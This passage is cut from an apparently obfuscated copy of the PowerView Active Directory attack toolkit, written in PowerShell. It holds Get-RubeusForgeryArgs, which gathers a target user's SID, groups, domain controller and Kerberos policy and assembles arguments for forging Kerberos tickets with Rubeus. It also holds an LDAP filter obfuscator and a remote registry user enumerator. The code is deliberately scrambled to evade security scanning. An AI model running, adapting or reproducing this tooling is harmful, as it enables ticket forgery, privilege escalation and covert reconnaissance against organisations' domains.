                    ${ouTv`AlU`eHA`sH}[${iN`deX}] = '\{0:x}' -f  ( Get-VARiABlE ("dH"+"3"+"tRm"))."vAL`Ue"::"TOUi`Nt`32"(${VAl`Ue}[${in`deX}])
                }
                for (${C}=0; ${c} -lt ${vA`L`UE}."le`NgTH"; ${C}++) {
                    if (${oUtVAL`Ueh`Ash}."K`eYS" -contains ${c}) {
                        ${Out`F`ilt`ER} += "$($OutValueHash[$c])"
                    }
                    else {
                        ${O`UTFIL`Ter} += "$($Value[$c])"
                    }
                }
            }
            else {
                ${o`U`TFILtEr} += "$($Value)"
            }
            if (${P`Ar`Ts}[${i}].("{2}{0}{1}"-f'de','xOf','In').Invoke(')') -ne -1) {
                ${Ne`XT} = ${pA`RTS}[${i}]."subsT`R`i`NG"(${P`ArtS}[${i}].("{1}{2}{0}"-f'xOf','In','de').Invoke(')'))
                if (${I} -eq ${pA`RTS}."lE`Ng`Th" - 1) {
                    ${o`U`TFILter} += "$($Next)"
                }
                else {
                    ${o`U`TfIlTEr} += "$($Next)="
                }
                if (${NE`Xt} -match ("{0}{3}{1}{2}" -f 'us','untCont','rol','erAcco')) {
                    ${s`KIp} = ${TR`UE}
                }
            }
            else {
                if (&("{0}{1}{3}{2}" -f 'Get-','Rand','m','o') -Maximum 2) {
                    ${OUt`FiL`T`Er} += "="
                }
                else {
                    ${OU`TFil`Ter} += '\3d'
                }
            }
        }
    }

    &("{2}{3}{0}{1}"-f'o','se','Wri','te-Verb') "[Get-ObfuscatedFilterString] Filter string obfuscated: $($OutFilter) "
    ${ou`TFILT`Er}
}

function CoNvE`R`T-LoGoNHou`RS {

    [OutputType([PSObject])]
    [CmdletBinding()]
    Param(
        [Parameter(ManDaTORy = ${T`RuE}, valUefroMPIPeliNE = ${t`RuE})]
        [ValidateNotNullOrEmpty()]
        ${LOGON`hOu`Rs}
    )

    BEGIN {
        ${d`AyS} = @{
            0 = ("{1}{0}" -f'ay','Sund');
            1 = ("{1}{0}"-f'ay','Sund');
            2 = ("{0}{1}" -f'S','unday');
            3 = ("{1}{0}{2}"-f 'on','M','day');
            4 = ("{0}{2}{1}" -f 'M','y','onda');
            5 = ("{0}{1}" -f 'Mond','ay');
            6 = ("{0}{1}" -f'Tuesd','ay');
            7 = ("{2}{1}{0}"-f'day','es','Tu');
            8 = ("{2}{1}{0}"-f'ay','esd','Tu');
            9 = ("{2}{0}{1}"-f'nesda','y','Wed');
            10 = ("{0}{1}" -f 'Wednes','day');
            11 = ("{2}{0}{1}" -f 'e','dnesday','W');
            12 = ("{0}{1}{2}" -f 'T','hur','sday');
            13 = ("{1}{0}" -f'ay','Thursd');
            14 = ("{1}{0}" -f 'hursday','T');
            15 = ("{2}{0}{1}" -f'ida','y','Fr');
            16 = ("{1}{2}{0}"-f'y','Frid','a');
            17 = ("{1}{0}" -f 'iday','Fr');
            18 = ("{0}{1}{2}" -f'Satu','rda','y');
            19 = ("{0}{1}{2}"-f 'Satu','rd','ay');
            20 = ("{1}{0}{2}"-f'u','Sat','rday');
        }

        ${HOu`RS} = @{
            0 = 1;
            1 = 2;
            2 = 4;
            3 = 8;
            4 = 16;
            5 = 32;
            6 = 64;
            7 = 128;
        }

        ${O`U`To`BJECt} = &("{1}{0}{2}"-f'c','New-Obje','t') ("{1}{2}{0}" -f 'ct','PSO','bje') -Property @{
            ("{0}{1}"-f'Mon','day') = @{};
            ("{2}{1}{0}"-f 'y','sda','Tue') = @{};
            ("{0}{1}{2}" -f'W','ednesda','y') = @{};
            ("{1}{2}{0}" -f 'y','Thur','sda') = @{};
            ("{0}{1}"-f'Fri','day') = @{};
            ("{1}{0}{2}" -f 'aturd','S','ay') = @{};
            ("{0}{2}{1}"-f'S','day','un') = @{};
        }
    }

    PROCESS {
        ${BYt`eC`oUN`TER} = 0
        ${DAy`cOU`Nt`ER} = 0

        foreach (${B`yTE} in ${LOgON`H`oU`RS}) {
            foreach (${B`It} in ${HO`U`Rs}."kE`YS") {
                ${p`E`RMIt`TEd} = ${f`AlSe}
                if (${b`YtE} -band ${h`OUrS}[${b`It}]) {
                    ${p`e`RmiTTeD} = ${T`RUe}
                }
                ${h`OUR} = ${B`YtEcoUnT`ER} * 8 + ${b`it}
                ${d`Ay} = ${da`YS}[${dA`Y`coUnter}]
                ${O`U`To`BjEcT}.${D`Ay}[${HO`Ur}] = ${p`ERMI`T`TED}
            }
            ${by`Te`COuNTer} += 1
            if (${BYT`eCo`UnT`eR} -eq 3) {
                ${b`yTECO`UNt`Er} = 0
            }
            ${DAyC`o`U`NTeR} += 1
        }

        ${O`UtobJ`eCT}
    }
}

function geT-`R`UBEusfORGE`RyaRgs {

    [OutputType({"{1}{0}"-f 'ing','Str'})]
    [CmdletBinding()]
    Param (
        [Parameter(PosiTIOn = 0, VALUEfRoMPIpeLINE = ${tR`Ue}, ValueFroMpIpelInEBYPrOpERtyNamE = ${t`RuE})]
        [Alias({"{4}{3}{1}{2}{0}" -f 'ame','mAcco','untN','a','S'}, {"{0}{1}" -f'N','ame'}, {"{2}{0}{1}"-f 'NSHostNa','me','D'})]
        [String[]]
        ${IDeNtI`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOM`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{3}{1}" -f'inCo','ller','Doma','ntro'})]
        [String]
        ${se`RVer},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`deNTi`AL} =  ( vARiaBLe ("{1}{0}"-f'tq02','7') -valuE )::"Em`pty",

        [Switch]
        ${s`SL},

        [Switch]
        ${o`BfUSc`ATe}
    )


    BEGIN {
        ${SEa`Rch`erArG`UM`en`Ts} = @{}
        if (${p`S`Bou`NDpARa`meteRs}[("{1}{0}{2}" -f'oma','D','in')]) { ${sE`ARcHe`R`ArgUM`ENTs}[("{1}{0}" -f 'main','Do')] = ${d`O`mAIN} }
        if (${ps`BoU`N`d`pA`RAmeTErS}[("{0}{1}" -f 'Serve','r')]) { ${S`EArCHErAR`gu`ME`NTS}[("{0}{1}" -f'Serve','r')] = ${Ser`Ver} }
        if (${PsBO`U`N`d`ParAmeTe`Rs}[("{1}{0}{2}{3}" -f'redenti','C','a','l')]) { ${SeaR`ch`eraRguMe`Nts}[("{2}{0}{1}" -f'a','l','Credenti')] = ${cr`EdE`NTIAL} }
        if (${Psbou`N`Dp`ArA`Me`TeRS}['SSL']) { ${s`eArc`hera`Rgu`MENTs}['SSL'] = ${s`SL} }
        if (${pSbO`Un`dpaR`Ame`T`ErS}[("{0}{2}{3}{1}" -f 'O','cate','b','fus')]) {${SeA`RCHERArGU`m`entS}[("{2}{3}{0}{1}"-f 'a','te','O','bfusc')] = ${ob`Fu`scA`TE} }

        ${ForE`StarGU`M`ents} = @{}
        if (${PSboundp`A`Ra`mEters}[("{1}{2}{0}"-f'ain','Do','m')]) { ${S`EA`R`CH`ErA`RGumEnTs}[("{0}{1}{2}" -f'Do','m','ain')] = ${dOm`A`in} }
        if (${pSbounD`pA`RAME`T`E`Rs}[("{0}{1}" -f'Se','rver')]) { ${S`EarcheR`A`Rg`UMeNTs}[("{1}{0}" -f 'ver','Ser')] = ${S`ErV`er} }
    }

    PROCESS {
        ${Fi`lteR} = ''
        ${Ide`NTI`Ty} | &("{4}{2}{3}{1}{0}"-f 'g','in','et-IdentityFilter','Str','G') | &("{0}{1}{2}"-f'ForEac','h','-Object') {
            ${FIl`TER} += ${_}
        }
        if (-not ${FI`l`TeR} -or ${f`ILT`eR} -eq '') {
            &("{2}{0}{1}"-f'rr','or','Write-E') ("{7}{4}{8}{9}{11}{13}{15}{14}{3}{6}{12}{1}{0}{5}{2}{10}" -f ' ',' is','r','en','Get','requi','tity argume','[','-Rube','u','ed!','sF','nt','or','Id','geryArgs] ')
            return
        }
        
        ${DOmaiN`POl`I`Cy} = &("{2}{0}{1}{3}" -f 't-DomainPo','l','Ge','icy') -Policy ("{2}{0}{1}"-f'mai','n','Do') @SearcherArguments
        

        &("{3}{0}{2}{1}"-f '-V','bose','er','Write') ('[Get'+'-R'+'ubeu'+'s'+'ForgeryAr'+'gs] '+'fil'+'t'+'er '+'st'+'ring'+': '+"(|$Filter)")
        ${reS`UL`TS} = &("{2}{1}{0}"-f 'ery','Qu','Invoke-LDAP') @SearcherArguments -LDAPFilter "(|$Filter)"
        ${r`eSu`lts} | &("{3}{1}{0}{2}"-f 'je','Ob','ct','Where-') {${_}} | &("{2}{1}{3}{0}" -f 't','orEac','F','h-Objec') {
            ${oUtarg`Um`e`NTs} = ''
            if (&("{2}{1}{0}"-f'mber','t-Me','Ge') -inputobject ${_} -name ("{3}{0}{1}{2}"-f't','ribut','es','At') -Membertype ("{0}{1}{3}{2}" -f'P','rop','rties','e')) {
                ${P`ROP} = @{}
                foreach (${a} in ${_}."A`TTribU`TeS"."ke`YS" | &("{1}{3}{0}{2}"-f't-Obje','S','ct','or')) {
                    if ((${a} -eq ("{1}{0}{2}"-f 'jects','ob','id')) -or (${A} -eq ("{1}{0}{2}"-f'histo','sid','ry')) -or (${A} -eq ("{1}{3}{0}{2}"-f'ectg','o','uid','bj')) -or (${a} -eq ("{2}{1}{3}{0}"-f 'ficate','ser','u','certi')) -or (${A} -eq ("{0}{3}{6}{2}{5}{4}{1}" -f'n','ptor','ydes','t','i','cr','securit')) -or (${a} -eq ("{2}{0}{1}" -f 'hour','s','logon'))) {
                        ${P`RoP}[${a}] = ${_}."aTtR`iBU`TEs"[${A}]
                    }
                    else {
                        ${v`A`lUes} = @()
                        foreach (${V} in ${_}."a`Tt`RibUTES"[${A}]."Ge`TVal`Ues"([byte[]])) {
                            ${vA`Lu`ES} +=   ( gET-vAriABlE  ("{1}{0}" -f'Lc','M1'))."val`UE"::"UT`F8"."g`etsTR`iNG"(${V})
                        }
                        ${PR`Op}[${A}] = ${Va`l`UES}
                    }
                }
            }
            else {
                ${pr`oP} = ${_}."PrO`P`ErtIEs"
            }

            ${ACco`U`NT} = &("{3}{5}{1}{2}{0}{4}" -f 'per','DA','PPro','Conver','ty','t-L') -Properties ${pR`OP}
            ${ac`cOUnt}."p`so`BjecT"."Ty`peNA`MeS".("{0}{1}"-f'Inse','rt').Invoke(0, ("{5}{1}{4}{3}{0}{2}" -f'ou','iew','nt','c','.Ac','PowerV'))

            
            ${acco`UN`TiD} = ${A`cCOUnt}."oBjECtS`Id".("{0}{1}{2}" -f 'S','u','bstring').Invoke(${AC`c`oUNt}."obj`EctSiD".("{2}{0}{1}"-f 'dexO','f','LastIn').Invoke('-')+1)
            ${Dom`AInS`ID} = ${a`CCoU`Nt}."ObJec`T`siD".("{1}{2}{0}" -f 'tring','Su','bs').Invoke(0, ${acC`ou`NT}."obJE`CtS`id".("{1}{2}{0}"-f 'f','LastInde','xO').Invoke('-'))

            
            ${grO`UP`Fi`lTEr} = ''
            foreach (${Gr`OUp} in ${A`Cc`ounT}."M`E`mBEroF") {
                ${g`R`OUPFiltEr} += "(distinguishedname=$group)"
            }
            ${gR`OUPS} = @()
            if (${groU`p`FiLT`eR}) {
                ${grou`PfIL`TeR} = "(|$GroupFilter)"
                &("{0}{2}{1}"-f'Write-V','ose','erb') ('[Get-Ru'+'be'+'us'+'For'+'g'+'eryAr'+'g'+'s] '+'fil'+'ter'+' '+'string:'+' '+"$GroupFilter")

                ${Re`S`ULtS} = &("{3}{0}{1}{2}{4}"-f'oke-LD','AP','Quer','Inv','y') @SearcherArguments -LDAPFilter "$GroupFilter"
                ${rEsU`l`Ts} | &("{1}{0}{3}{2}" -f 'bje','Where-O','t','c') {${_}} | &("{1}{0}{3}{2}"-f'ch-','ForEa','bject','O') {
                    if (&("{1}{0}{2}" -f'et-Membe','G','r') -inputobject ${_} -name ("{0}{1}{3}{2}"-f'At','tri','s','bute') -Membertype ("{1}{0}{2}"-f 'per','Pro','ties')) {
                        ${PR`op} = @{}
                        foreach (${A} in ${_}."A`TTrIbUT`ES"."k`EyS" | &("{0}{1}{3}{2}"-f 'S','o','t','rt-Objec')) {
                            if ((${a} -eq ("{2}{1}{0}"-f 'id','cts','obje')) -or (${a} -eq ("{0}{2}{1}" -f'si','story','dhi')) -or (${A} -eq ("{2}{1}{0}" -f'd','gui','object')) -or (${a} -eq ("{1}{0}{3}{2}"-f'if','usercert','e','icat')) -or (${A} -eq ("{4}{5}{2}{1}{3}{0}" -f 'ptor','des','urity','cri','nt','sec')) -or (${a} -eq ("{0}{2}{1}" -f'log','ours','onh'))) {
                                ${p`ROp}[${a}] = ${_}."aTtrIbU`T`ES"[${A}]
                            }
                            else {
                                ${v`Al`UEs} = @()
                                foreach (${V} in ${_}."aTT`RibUT`eS"[${A}]."G`etvAL`U`es"([byte[]])) {
                                    ${v`AlUEs} +=  ${M`1LC}::"u`TF8"."GETsT`RInG"(${V})
                                }
                                ${Pr`OP}[${A}] = ${V`ALUeS}
                            }
                        }
                    }
                    else {
                        ${p`ROP} = ${_}."pROpE`RtI`Es"
                    }

                    ${grou`PO`BjECt} = &("{1}{2}{0}{3}" -f 'PPr','Convert-L','DA','operty') -Properties ${PR`OP}
                    ${G`R`OUPId} = ${gRoU`po`B`jeCT}."o`BjEC`TsiD".("{1}{0}{2}" -f'stri','Sub','ng').Invoke(${gR`OUpOBj`ECt}."oB`jeCtS`ID".("{0}{1}{2}" -f'L','a','stIndexOf').Invoke('-')+1)
                    ${GR`OuPs} += ${gRo`U`PId}
                }
            }

            
            ${dOm`AInOB`j`ECT} = &("{2}{1}{0}" -f 'ain','om','Get-D') @ForestArguments
            ${d`oma`in} = ${dom`A`INobjecT}."n`AME"
            ${fO`REST} = ${DoM`AiN`O`BjeCt}."foRe`ST"

            ${F`O`Restdn} = "DC=$($Forest -replace '\.',',DC=')"
            ${cON`F`igDn} = "CN=Configuration,$ForestDN"
            ${nEt`Bio`SfilteR} = "(&(netbiosname=*)(dnsroot=$Domain))"
            ${n`ET`BIOSna`me} = (&("{0}{1}{3}{2}" -f 'G','et-Doma','bject','inO') -SearchBase "$ConfigDN" -LdapFilter "$NetbiosFilter" @SearcherArguments)."N`ETBIos`NaME"

            
            ${N`OW} = &("{0}{1}" -f 'Get-','Date')

            
            ${o`U`TAr`gUmE`NtS} = "/user:$($Account.samaccountname) /id:$AccountID /sid:$DomainSID /netbios:$NetbiosName /dc:$($DomainObject.DomainControllers[0].Name) /domain:$Domain /pgid:$($Account.primarygroupid) /displayname:""$($Account.displayname)"" /logoncount:$($Account.logoncount) /badpwdcount:$($Account.badpwdcount) /pwdlastset:""$($Account.pwdlastset.ToString())"" /lastlogon:""$($Now.AddSeconds(-$(Get-Random -Maximum 10)).ToString())"" "
            if (${a`cC`OuNT}."u`SEraccoUN`TCoN`Tr`OL" -ne ("{0}{2}{1}{3}"-f'N','U','ORMAL_ACCO','NT')) {
                ${Outa`Rg`U`ME`NtS} += " /uac:$($Account.useraccountcontrol -replace ' ','')"
            }
            if (${g`Ro`Ups}."l`enG`TH" -gt 0) {
                ${oUTARGuME`N`TS} += " /groups:$($Groups -join ',') "
            }
            if (${AC`cO`UNt}."Sc`R`iP`TPATH") {
                ${ouTaRG`Um`e`Nts} += " /scriptpath:""$($Account.scriptpath)"" " 
            }
            if (${AC`COu`Nt}."PRofIleP`A`Th") {
                ${Ou`T`ARgU`Ments} += " /profilepath:""$($Account.profilepath)"" " 
            }
            if (${acCou`Nt}."h`OmeD`RiVE") {
                ${OuTarg`U`meN`TS} += " /homedrive:""$($Account.homedrive)"" " 
            }
            if (${acco`UNt}."Ho`m`Ed`iReCtO`Ry") {
                ${ou`TARG`Ume`NTS} += " /homedir:""$($Account.homedirectory)"" " 
            }
            if (${A`c`coUnt}."lo`G`OnhoUrs") {
                ${l`O`gofFT`ImE} = &("{2}{0}{1}{3}" -f'-Logof','f','Get','Time') -LogonHours ${a`CC`ouNt}."lo`gOnhOu`Rs" -LogonTime ${n`ow}
                if (${l`oGO`FFT`IMe} -and ${L`og`off`TImE} -ne ${N`Ow}) {
                    ${O`U`TaR`GumE`NtS} += " /logofftime:""$($LogoffTime.AddMinutes(-$LogoffTime.Minute).AddSeconds(-$LogoffTime.Second).ToString())"" "
                }
            }
            elseif (${L`Og`offTI`Me} -eq ${N`Ow}) {
                &("{1}{0}{2}"-f'te-','Wri','Warning') ("{4}{13}{8}{2}{11}{6}{5}{12}{1}{3}{9}{7}{10}{0}"-f 'ow!','lo','Args] User i','wed to logi','[Get-RubeusFor','n',' ',' ','ery','n','n','s','ot al','g')
            }
            if (${d`omAinpO`lICy}."S`yS`TEmaCC`eSS"."Mi`Ni`MuMpa`SSw`Ord`AGe" -gt 0) {
                ${OUtARGUM`EN`Ts} += " /minpassage:$($DomainPolicy.SystemAccess.MinimumPasswordAge) "
            }
            
            if (${dOMA`i`NPOLICY}."sY`sTemAcC`Ess"."MAxImu`MPa`Ss`wORDaGe" -gt 0 -and ${a`cco`UnT}."u`Se`Ra`cCo`UnTcOnt`ROL" -notmatch ("{4}{5}{3}{1}{2}{0}"-f 'ORD','E_','PASSW','_EXPIR','DO','NT')) {
                ${oU`Ta`RgU`meNTs} += " /maxpassage:$($DomainPolicy.SystemAccess.MaximumPasswordAge) "
            }
            
            if (${GR`OU`Ps}.("{1}{0}{2}"-f 'o','C','ntains').Invoke("525")) {
                ${OUTA`RGuM`En`Ts} += ("{2}{3}{7}{4}{5}{8}{6}{0}{1}" -f'l:2','40m',' /e','ndtime:','40m /re','n','til','2','ew')
            }
            else {
                if (${DOMai`NpoLi`cy}."kE`RBErosPO`LIcy"."ma`xTiCkE`T`AGE" -ne 10) {
                    ${OU`T`ArguMeN`TS} += " /endtime:$($DomainPolicy.KerberosPolicy.MaxTicketAge)h "
                }
                if (${DOmA`i`NPolICy}."KErBerOS`po`li`cy"."MaxreN`EWa`Ge" -ne 7) {
                    ${ouT`A`R`guMeNtS} += " /renewtill:$($DomainPolicy.KerberosPolicy.MaxRenewAge)d "
                }
            }

            ${oUTARG`U`MeN`Ts}
        }
    }
}

function G`Et`-loGO`FftIme {

    [OutputType([DateTime])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        ${l`oGO`NHouRS},

        [DateTime]
        ${L`OGOn`TimE}
    )

    BEGIN {
        ${da`YS} = @{
            1 = ("{1}{0}"-f'unday','S');
            2 = ("{1}{0}"-f 'y','Monda');
            3 = ("{0}{2}{1}"-f'Tues','y','da');
            4 = ("{1}{2}{0}"-f'esday','We','dn');
            5 = ("{0}{1}"-f 'Thurs','day');
            6 = ("{0}{1}"-f'Fri','day');
            7 = ("{2}{0}{1}" -f 'atu','rday','S');
        }
    }

    PROCESS {
        ${hO`UR} = ${LOG`o`Nti`ME}."H`OUR"
        ${D`Ay} = ${dA`YS}[${Lo`gonTi`Me}."D`Ay"]
        if (-not ${Lo`Gonh`OuRs}.${d`Ay}.${H`OUR}) {
            &("{3}{2}{0}{1}" -f'bo','se','rite-Ver','W') ("{3}{6}{5}{7}{0}{2}{8}{4}{1}" -f 'fT','gon now!','ime]','[Ge','ot allowed to lo','Log','t-','of',' User is n')
            ${lo`gO`Ntime}
        }
        ${o`UTTIMe} = ${L`OGonTi`ME}
        ${l`eFt`over} = 23 - ${H`ouR}
        ${foU`NDL`OGOFF} = ${fa`l`se}
        for (${I}=0; ${i} -lt 7; ${I}++) {
            ${D`AY} = ${D`AYS}[$(${L`oGOnT`Ime}."d`AY" + ${I})]
            if (${i} -eq 0) {
                ${c`ouNteR} = ${H`oUR} + 1
            }
            else {
                ${cO`UnteR} = 0
            }
            do {
                ${outt`i`mE} = ${ou`T`TimE}.("{0}{1}{2}"-f 'Ad','dH','ours').Invoke(1)
                if (-not ${LoG`ONH`o`URs}.${d`Ay}.${c`o`UNteR}) {
                    ${foun`DlO`go`Ff} = ${tr`UE}
                    break
                }
                ${C`ou`Nter} += 1
            } while (${cO`UNteR} -lt 24)
            if (${f`OU`NdlOGoff}) {
                break
            }
        }

        if (-not ${FOUndl`ogO`Ff} -and ${H`Our} -gt 0) {
            ${d`AY} = ${Da`Ys}[${l`OGONt`Ime}."d`AY"]
            for (${i}=0; ${i} -lt ${H`ouR}; ${i}++) {
                ${OUTt`i`me} = ${o`U`TtIME}.("{0}{2}{1}"-f'Add','ours','H').Invoke(1)
                if (-not ${loGoN`hO`UrS}.${d`AY}.${I}) {
                    ${F`oUNd`lOgOfF} = ${t`RUE}
                    break
                }
            }
        }

        if (${fo`UNdl`oG`Off}) {
            ${OU`TTiMe}
        }
        else {
            ${F`ou`NDlOgOFf}
        }
    }
}

function gET`-regI`StRYuS`ER`eN`UM {


    [CmdletBinding(suPpoRtSshouLdpROceSs=${T`RUE},
        conFIRMimPACT="ME`diUm")]
    Param
    ( 
        [parameter(posiTioN=0, vALUEFRomPIPeline=${T`RUe}, VAluEFROMpipElinebypRoPERTynAMe=${T`Rue})]
        [Alias({"{2}{1}{0}" -f 'ame','NSHostN','D'}, {"{0}{1}"-f 'Nam','e'}, {"{1}{0}" -f 'erver','S'})]
        [String[]]
        ${comp`U`TeR`N`AME} = '.',

        [Switch]
        ${chE`Ck}
    )
    Begin {
    }
    Process {
        Foreach (${COMp`UTEr} in ${C`OMputern`A`me}) {
            if (&("{2}{1}{3}{0}" -f'n','c','Test-Conne','tio') ${C`oM`Pu`TEr} -Count 2 -Quiet) {
                ${R`EG} =   (GEt-ChiLdItEM  ("{2}{1}{3}{0}" -f'e:En0F','rIAB','Va','l') )."v`AlUE"::("{1}{2}{0}{3}"-f 'RemoteBas','Ope','n','eKey').Invoke(("{0}{1}" -f'U','sers'), ${ComP`U`Ter})
                ${SuBke`Ys} = ${r`EG}.("{4}{2}{1}{0}{3}" -f 'm','a','yN','es','GetSubKe').Invoke() | &('?'){${_} -notmatch ("{1}{2}{0}"-f 'T','.DE','FAUL') -and ${_} -notmatch ("{1}{2}{0}" -f 's','_Clas','se')}
                if (${p`SBoUnD`PaR`AmEt`eRS}[("{1}{0}"-f 'heck','C')] -and ${S`U`BkeYs}."lEN`GTh" -gt 0) {
                    ${COMpUt`eR}
                } elseif (${S`UBK`EyS}."l`enGTh" -gt 0) {
                ${u`SerS} = @()
                foreach (${s`U`BkEY} in ${sub`kE`ys}) {
                    ${u`SeR} = &("{0}{2}{1}"-f 'N','w-Object','e') ("{0}{1}{2}" -f 'psobje','c','t')
                    ${uS`eR} | &("{1}{2}{0}"-f'r','Add-M','embe') -Name ("{1}{0}" -f 'D','SI') -MemberType ("{2}{0}{1}"-f'r','ty','NotePrope') -Value ${sUbk`eY}
                    ${u`Ser} | &("{1}{0}{2}"-f 'M','Add-','ember') -Name ("{0}{1}"-f'N','ame') -MemberType ("{2}{1}{0}" -f 'teProperty','o','N') -Value (&("{3}{1}{0}{4}{2}"-f 'F','vert','D','Con','rom-SI') ${SUBK`EY})
                    ${u`sERs} += ,${uS`er}
                }
                ${O`Bj} = &("{0}{2}{1}"-f 'Ne','t','w-Objec') ("{1}{2}{0}" -f't','p','sobjec')
                ${O`BJ} | &("{2}{1}{0}"-f'mber','-Me','Add') -Name ("{1}{0}"-f 'omputer','C') -MemberType ("{0}{2}{3}{1}" -f 'NotePr','erty','o','p') -Value ${COmPU`T`ER}
                ${O`BJ} | &("{2}{1}{0}"-f 'Member','dd-','A') -Name ("{1}{0}" -f'rs','Use') -MemberType ("{1}{2}{0}"-f 'operty','NoteP','r') -Value ${uSe`Rs}
                ${O`BJ}
                } else {
                    &("{0}{2}{3}{1}" -f 'Wr','ning','ite-W','ar') ("$Computer "+'c'+'on'+'nected '+'b'+'ut '+'di'+'d '+'not'+' '+'ret'+'ur'+'n '+'s'+'ub'+'keys')
                }
            }
            else {
                &("{2}{1}{0}"-f 'rror','-E','Write') ("$Computer "+'not'+' '+'r'+'ea'+'c'+'hable')
            }
        }
    }
    End {
        
    }
}












${M`Od} = &("{2}{0}{3}{1}"-f'ew','moryModule','N','-InMe') -ModuleName ("{1}{0}"-f 'n32','Wi')




${s`AMaCcouN`TTyP`eenuM} = &("{1}{0}" -f'um','psen') ${M`OD} ("{1}{0}{8}{2}{4}{5}{3}{7}{6}"-f'S','PowerView.','A','ype','cc','ountT','num','E','am') ("{2}{0}{1}"-f'3','2','UInt') @{
    ("{0}{3}{4}{2}{1}"-f'D','ECT','_OBJ','OMA','IN')                   =   ("{1}{0}{2}"-f '0','0x','0000000')
    ("{2}{1}{0}"-f 'ECT','_OBJ','GROUP')                    =   ("{3}{1}{0}{2}" -f '0','0','0','0x10000')
    ("{6}{0}{4}{5}{3}{1}{2}"-f'ITY_','JE','CT','UP_OB','GR','O','NON_SECUR')       =   ("{0}{1}{2}"-f'0x1','000','0001')
    ("{2}{3}{0}{1}" -f'_OB','JECT','AL','IAS')                    =   ("{0}{1}{2}" -f'0x','20000','000')
    ("{5}{4}{3}{1}{0}{2}{6}"-f'_OB','_ALIAS','J','ECURITY','S','NON_','ECT')       =   ("{0}{2}{1}" -f '0','1','x2000000')
    ("{3}{1}{0}{2}"-f'R_OBJ','SE','ECT','U')                     =   ("{2}{0}{1}" -f '000000','0','0x3')
    ("{2}{0}{1}{3}"-f 'CHI','NE_ACC','MA','OUNT')                 =   ("{0}{2}{1}" -f'0x','0001','3000')
    ("{4}{1}{2}{3}{0}" -f'UNT','S','T_ACC','O','TRU')                   =   ("{1}{2}{0}{3}" -f '00','0x300','00','2')
    ("{3}{0}{2}{1}"-f'_BASIC','UP','_GRO','APP')                 =   ("{2}{0}{1}" -f 'x','40000000','0')
    ("{0}{1}{2}" -f'APP','_QUERY','_GROUP')                 =   ("{0}{2}{1}" -f'0x400','1','0000')
    ("{1}{3}{0}{2}" -f 'NT_TY','ACCO','PE_MAX','U')                =   ("{3}{1}{2}{0}"-f 'f','ff','ffff','0x7')
}


${gr`oU`Ptyp`EE`NuM} = &("{1}{0}" -f'um','psen') ${m`oD} ("{3}{4}{0}{1}{2}" -f 'iew','.GroupType','Enum','P','owerV') ("{1}{0}{2}"-f'I','U','nt32') @{
    ("{2}{0}{3}{1}" -f'EATE','TEM','CR','D_BY_SYS')               =   ("{2}{3}{1}{0}" -f '1','00','0x0000','0')
    ("{2}{1}{0}{3}" -f'AL_SCO','B','GLO','PE')                    =   ("{1}{3}{0}{2}" -f '0000','0x0','2','00')
    ("{4}{1}{3}{2}{0}" -f 'COPE','LO','L_S','CA','DOMAIN_')              =   ("{3}{2}{0}{1}"-f'000','0004','x0','0')
    ("{1}{2}{0}" -f 'ERSAL_SCOPE','U','NIV')                 =   ("{2}{0}{1}" -f'x000000','08','0')
    ("{2}{1}{0}"-f '_BASIC','P','AP')                       =   ("{2}{1}{0}"-f'0010','0','0x000')
    ("{2}{1}{0}" -f'RY','QUE','APP_')                       =   ("{1}{2}{0}" -f'000020','0','x00')
    ("{2}{0}{1}"-f 'CUR','ITY','SE')                        =   ("{2}{0}{3}{1}"-f '00','0','0x80','000')
} -Bitfield


${U`AC`enUm} = &("{2}{0}{1}" -f 'senu','m','p') ${m`oD} ("{3}{2}{4}{0}{1}" -f 'ew.UACEnu','m','ower','P','Vi') ("{2}{1}{0}" -f'32','nt','UI') @{
    ("{1}{2}{0}" -f 'T','SCRI','P')                          =   1
    ("{2}{3}{1}{0}"-f'ABLE','S','ACCOUNTD','I')                  =   2
    ("{2}{0}{3}{1}"-f 'OMEDIR','REQUIRED','H','_')                =   8
    ("{1}{0}"-f'OCKOUT','L')                         =   16
    ("{1}{0}{3}{2}" -f'ASS','P','QD','WD_NOTRE')                  =   32
    ("{3}{1}{2}{0}" -f'ANGE','NT_','CH','PASSWD_CA')              =   64
    ("{0}{3}{1}{4}{5}{6}{2}" -f'ENC','ED_','D','RYPT','TE','XT_PW','D_ALLOWE')      =   128
    ("{0}{3}{4}{1}{2}"-f'TEMP_D','E','_ACCOUNT','UPLI','CAT')          =   256
    ("{2}{3}{1}{4}{0}"-f'COUNT','AL','NO','RM','_AC')                  =   512
    ("{2}{1}{0}{6}{4}{3}{5}"-f 'RUS','_T','INTERDOMAIN','ACCOUN','_','T','T')       =   2048
    ("{2}{1}{3}{4}{0}"-f '_ACCOUNT','ORKSTATION','W','_TRU','ST')       =   4096
    ("{0}{1}{3}{2}" -f 'SERVER','_TRUST','OUNT','_ACC')            =   8192
    ("{4}{1}{0}{2}{3}"-f 'SSW','RE_PA','OR','D','DONT_EXPI')            =   65536
    ("{0}{1}{2}{5}{4}{3}" -f'MNS_LOG','ON','_ACC','T','N','OU')               =   131072
    ("{2}{4}{1}{3}{0}"-f'IRED','R','S','TCARD_REQU','MA')              =   262144
    ("{5}{6}{3}{2}{1}{0}{4}"-f 'OR_','F','D_','TE','DELEGATION','TR','US')          =   524288
    ("{0}{2}{1}{3}{4}"-f'NO','E','T_D','LEGATE','D')                   =   1048576
    ("{1}{3}{2}{4}{0}" -f 'NLY','US','_','E_DES_KEY','O')                =   2097152
    ("{3}{2}{4}{1}{0}" -f'H','EAUT','ONT_REQ_P','D','R')                =   4194304
    ("{2}{4}{3}{1}{0}{5}"-f 'XP','E','PASSWO','D_','R','IRED')                =   8388608
    ("{1}{3}{2}{5}{0}{4}" -f'AT','TRU','OR_DEL','STED_TO_AUTH_F','ION','EG')  =   16777216
    ("{0}{1}{3}{2}"-f 'N','O_A','DATA_REQUIRED','UTH_')           =   33554432
    ("{3}{5}{0}{2}{1}{4}"-f'IAL_SECRET','_ACC','S','PAR','OUNT','T')         =   67108864
} -Bitfield


${w`TscoNn`E`cTSta`TE} = &("{2}{0}{1}"-f'nu','m','pse') ${m`oD} ("{3}{4}{2}{0}{6}{5}{1}"-f'STATE_CL','S','CONNECT','W','TS_','S','A') ("{0}{1}" -f'U','Int16') @{
    ("{1}{0}"-f'tive','Ac')       =    0
